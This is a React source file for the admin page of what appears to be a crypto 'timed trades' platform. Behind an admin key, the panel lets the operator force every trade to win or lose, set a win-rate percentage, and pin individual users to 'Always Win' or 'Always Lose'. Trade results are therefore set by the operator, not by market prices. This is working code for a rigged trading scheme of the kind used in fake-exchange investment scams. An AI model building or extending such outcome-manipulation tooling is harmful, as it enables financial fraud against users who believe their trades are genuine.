'use client';

import { useState, useEffect, useCallback } from 'react';
import { Shield, RefreshCw, Users, TrendingUp, TrendingDown, Clock, Loader2, AlertCircle } from 'lucide-react';

interface TradeSettingsData {
  globalMode: 'random' | 'all_win' | 'all_lose';
  winRatePercent: number;
  userOverrides: Record<string, string>;
}

interface TradeStats {
  totalTrades: number;
  pendingTrades: number;
  wins: number;
  losses: number;
}

interface RecentTrade {
  id: string;
  transactionId: string;
  user: string;
  userId: string;
  type: string;
  cryptoSymbol: string;
  amount: number;
  period: number;
  profitPercent: number;
  result: string;
  profitAmount: number;
  forcedResult: string | null;
  createdAt: string;
}

interface UserItem {
  id: string;
  name: string;
}

export default function AdminPage() {
  const [adminKey, setAdminKey] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [success, setSuccess] = useState('');

  const [settings, setSettings] = useState<TradeSettingsData | null>(null);
  const [stats, setStats] = useState<TradeStats | null>(null);
  const [recentTrades, setRecentTrades] = useState<RecentTrade[]>([]);
  const [users, setUsers] = useState<UserItem[]>([]);

  // Form state
  const [globalMode, setGlobalMode] = useState<string>('random');
  const [winRate, setWinRate] = useState<number>(50);
  const [selectedUser, setSelectedUser] = useState('');
  const [userOverride, setUserOverride] = useState<string>('');

  const headers = useCallback(() => ({
    'Content-Type': 'application/json',
    'x-admin-key': adminKey,
  }), [adminKey]);

  const fetchData = useCallback(async () => {
    setIsLoading(true);
    setError('');
    try {
      const res = await fetch('/api/admin/trade-settings', { headers: headers() });
      if (res.status === 401) {
        setIsAuthenticated(false);
        setError('Invalid admin key');
        return;
      }
      if (!res.ok) throw new Error('Failed to fetch');
      const data = await res.json();
      setSettings(data.settings);
      setStats(data.stats);
      setRecentTrades(data.recentTrades);
      setUsers(data.users);
      setGlobalMode(data.settings.globalMode);
      setWinRate(data.settings.winRatePercent);
      setIsAuthenticated(true);
    } catch (err: any) {
      setError(err.message || 'Failed to load');
    } finally {
      setIsLoading(false);
    }
  }, [headers]);

  const handleLogin = async () => {
    if (!adminKey.trim()) return;
    await fetchData();
  };

  const handleSaveSettings = async () => {
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({ globalMode, winRatePercent: winRate }),
      });
      if (!res.ok) throw new Error('Failed to save');
      const data = await res.json();
      setSettings(data.settings);
      setSuccess('Settings saved');
      setTimeout(() => setSuccess(''), 3000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const handleSetUserOverride = async () => {
    if (!selectedUser) return;
    setError('');
    setSuccess('');
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({
          userOverrides: { [selectedUser]: userOverride || null },
        }),
      });
      if (!res.ok) throw new Error('Failed to save');
      const data = await res.json();
      setSettings(data.settings);
      setSelectedUser('');
      setUserOverride('');
      setSuccess('User override saved');
      setTimeout(() => setSuccess(''), 3000);
    } catch (err: any) {
      setError(err.message);
    }
  };

  const removeUserOverride = async (userId: string) => {
    try {
      const res = await fetch('/api/admin/trade-settings', {
        method: 'PUT',
        headers: headers(),
        body: JSON.stringify({
          userOverrides: { [userId]: null },
        }),
      });
      if (!res.ok) throw new Error('Failed to remove');
      const data = await res.json();
      setSettings(data.settings);
    } catch (err: any) {
      setError(err.message);
    }
  };

  // Login screen
  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-[#0a0a0a] flex items-center justify-center p-4">
        <div className="glass-card w-full max-w-sm p-6 space-y-4">
          <div className="text-center">
            <Shield className="mx-auto mb-2 text-accent" size={32} />
            <h1 className="text-lg font-bold">Admin Panel</h1>
            <p className="text-xs text-gray-400">Enter your admin secret key</p>
          </div>
          {error && (
            <div className="p-2 rounded bg-danger/20 text-danger text-xs flex items-center gap-1.5">
              <AlertCircle size={12} /> {error}
            </div>
          )}
          <input
            type="password"
            value={adminKey}
            onChange={(e) => setAdminKey(e.target.value)}
            onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
            placeholder="Admin secret key"
            className="w-full px-3 py-2 rounded-lg bg-white/5 border border-white/10 focus:border-accent focus:outline-none text-sm"
          />
          <button
            onClick={handleLogin}
            disabled={isLoading}
            className="w-full py-2 rounded-lg bg-accent hover:bg-accent/80 font-semibold text-sm transition-colors disabled:opacity-50"
          >
            {isLoading ? 'Verifying...' : 'Access Admin Panel'}
          </button>
        </div>
      </div>
    );
  }

  const winPercent = stats && stats.totalTrades > 0
    ? ((stats.wins / (stats.wins + stats.losses)) * 100).toFixed(1)
    : '0.0';

  return (
    <div className="min-h-screen bg-[#0a0a0a] p-4 max-w-5xl mx-auto space-y-4">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Shield className="text-accent" size={24} />
          <h1 className="text-lg font-bold">Trade Control Panel</h1>
        </div>
        <button
          onClick={fetchData}
          className="p-2 rounded-lg hover:bg-white/10 transition-colors"
          title="Refresh"
        >
          <RefreshCw size={16} className={isLoading ? 'animate-spin' : ''} />
        </button>
      </div>

      {/* Messages */}
      {error && (
        <div className="p-2 rounded bg-danger/20 text-danger text-xs">{error}</div>
      )}
      {success && (
        <div className="p-2 rounded bg-success/20 text-success text-xs">{success}</div>
      )}

      {/* Stats */}
      {stats && (
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Total Trades</p>
            <p className="text-xl font-bold">{stats.totalTrades}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Pending</p>
            <p className="text-xl font-bold text-yellow-400">{stats.pendingTrades}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Wins</p>
            <p className="text-xl font-bold text-success">{stats.wins}</p>
          </div>
          <div className="glass-card p-3 text-center">
            <p className="text-[10px] text-gray-400">Losses</p>
            <p className="text-xl font-bold text-danger">{stats.losses}</p>
          </div>
        </div>
      )}

      <div className="grid md:grid-cols-2 gap-4">
        {/* Global Settings */}
        <div className="glass-card p-4 space-y-4">
          <h2 className="text-sm font-bold flex items-center gap-1.5">
            <TrendingUp size={14} className="text-accent" /> Global Trade Mode
          </h2>

          <div className="space-y-2">
            {[
              { value: 'random', label: 'Random', desc: 'Uses win rate percentage below' },
              { value: 'all_win', label: 'All Win', desc: 'Every trade wins' },
              { value: 'all_lose', label: 'All Lose', desc: 'Every trade loses' },
            ].map((mode) => (
              <label
                key={mode.value}
                className={`flex items-center gap-3 p-2.5 rounded-lg border cursor-pointer transition-all ${
                  globalMode === mode.value
                    ? 'border-accent bg-accent/10'
                    : 'border-white/10 bg-white/5 hover:bg-white/10'
                }`}
              >
                <input
                  type="radio"
                  name="globalMode"
                  value={mode.value}
                  checked={globalMode === mode.value}
                  onChange={(e) => setGlobalMode(e.target.value)}
                  className="accent-accent"
                />
                <div>
                  <p className="text-sm font-medium">{mode.label}</p>
                  <p className="text-[10px] text-gray-400">{mode.desc}</p>
                </div>
              </label>
            ))}
          </div>

          {globalMode === 'random' && (
            <div>
              <label className="text-xs text-gray-400 mb-1 block">
                Win Rate: <span className="text-white font-bold">{winRate}%</span>
              </label>
              <input
                type="range"
                min={0}
                max={100}
                value={winRate}
                onChange={(e) => setWinRate(Number(e.target.value))}
                className="w-full accent-accent"
              />
              <div className="flex justify-between text-[10px] text-gray-500">
                <span>0% (always lose)</span>
                <span>100% (always win)</span>
              </div>
            </div>
          )}

          <button
            onClick={handleSaveSettings}
            className="w-full py-2 rounded-lg bg-accent hover:bg-accent/80 font-semibold text-sm transition-colors"
          >
            Save Settings
          </button>
        </div>

        {/* Per-User Overrides */}
        <div className="glass-card p-4 space-y-4">
          <h2 className="text-sm font-bold flex items-center gap-1.5">
            <Users size={14} className="text-accent" /> User Overrides
          </h2>

          <p className="text-[10px] text-gray-400">
            Override global settings for a specific user. User overrides take priority over global mode.
          </p>

          <div className="flex gap-2">
            <select
              value={selectedUser}
              onChange={(e) => setSelectedUser(e.target.value)}
              className="flex-1 px-2 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs focus:border-accent focus:outline-none"
            >
              <option value="">Select user...</option>
              {users.map((u) => (
                <option key={u.id} value={u.id}>{u.name}</option>
              ))}
            </select>
            <select
              value={userOverride}
              onChange={(e) => setUserOverride(e.target.value)}
              className="px-2 py-1.5 rounded-lg bg-white/5 border border-white/10 text-xs focus:border-accent focus:outline-none"
            >
              <option value="">Auto</option>
              <option value="win">Always Win</option>
              <option value="lose">Always Lose</option>
            </select>
            <button
              onClick={handleSetUserOverride}
              disabled={!selectedUser}
              className="px-3 py-1.5 rounded-lg bg-accent hover:bg-accent/80 text-xs font-semibold disabled:opacity-50 transition-colors"
            >
              Set
            </button>
          </div>

          {/* Active overrides */}
          {settings && Object.keys(settings.userOverrides).length > 0 ? (
            <div className="space-y-1">
              <p className="text-[10px] text-gray-400 font-semibold">Active Overrides:</p>
              {Object.entries(settings.userOverrides).map(([userId, override]) => {
                const userName = users.find((u) => u.id === userId)?.name || userId;
                return (
                  <div key={userId} className="flex items-center justify-between p-2 rounded-lg bg-white/5 text-xs">
                    <span>{userName}</span>
                    <div className="flex items-center gap-2">
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                        override === 'win' ? 'bg-success/20 text-success' : 'bg-danger/20 text-danger'
                      }`}>
                        {override.toUpperCase()}
                      </span>
                      <button
                        onClick={() => removeUserOverride(userId)}
                        className="text-gray-400 hover:text-danger text-[10px] underline"
                      >
                        Remove
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          ) : (
            <p className="text-[10px] text-gray-500 italic">No user overrides active</p>
          )}
        </div>
      </div>

      {/* Recent Trades */}
      <div className="glass-card p-4 space-y-3">
        <h2 className="text-sm font-bold flex items-center gap-1.5">
          <Clock size={14} className="text-accent" /> Recent Timed Trades
        </h2>
        {recentTrades.length === 0 ? (
          <p className="text-xs text-gray-500 italic">No trades yet</p>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-[11px]">
              <thead>
                <tr className="text-gray-400 border-b border-white/10">
                  <th className="text-left py-1.5 px-2">User</th>
                  <th className="text-left py-1.5 px-2">Type</th>
                  <th className="text-left py-1.5 px-2">Symbol</th>
                  <th className="text-right py-1.5 px-2">Amount</th>
                  <th className="text-center py-1.5 px-2">Period</th>
                  <th className="text-center py-1.5 px-2">Result</th>
                  <th className="text-right py-1.5 px-2">Profit</th>
                  <th className="text-right py-1.5 px-2">Time</th>
                </tr>
              </thead>
              <tbody>
                {recentTrades.map((t) => (
                  <tr key={t.id} className="border-b border-white/5 hover:bg-white/5">
                    <td className="py-1.5 px-2 truncate max-w-[100px]">{t.user}</td>
                    <td className={`py-1.5 px-2 font-semibold ${t.type === 'buy' ? 'text-success' : 'text-danger'}`}>
                      {t.type.toUpperCase()}
                    </td>
                    <td className="py-1.5 px-2">{t.cryptoSymbol}</td>
                    <td className="py-1.5 px-2 text-right">{t.amount.toLocaleString()}</td>
                    <td className="py-1.5 px-2 text-center">{t.period}s</td>
                    <td className="py-1.5 px-2 text-center">
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
                        t.result === 'win' ? 'bg-success/20 text-success' :
                        t.result === 'lose' ? 'bg-danger/20 text-danger' :
                        'bg-yellow-500/20 text-yellow-400'
                      }`}>
                        {t.result.toUpperCase()}
                      </span>
                    </td>
                    <td className={`py-1.5 px-2 text-right ${t.result === 'win' ? 'text-success' : ''}`}>
                      {t.result === 'win' ? `+${t.profitAmount.toLocaleString()}` : '—'}
                    </td>
                    <td className="py-1.5 px-2 text-right text-gray-400">
                      {new Date(t.createdAt).toLocaleTimeString()}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>
    </div>
  );
}
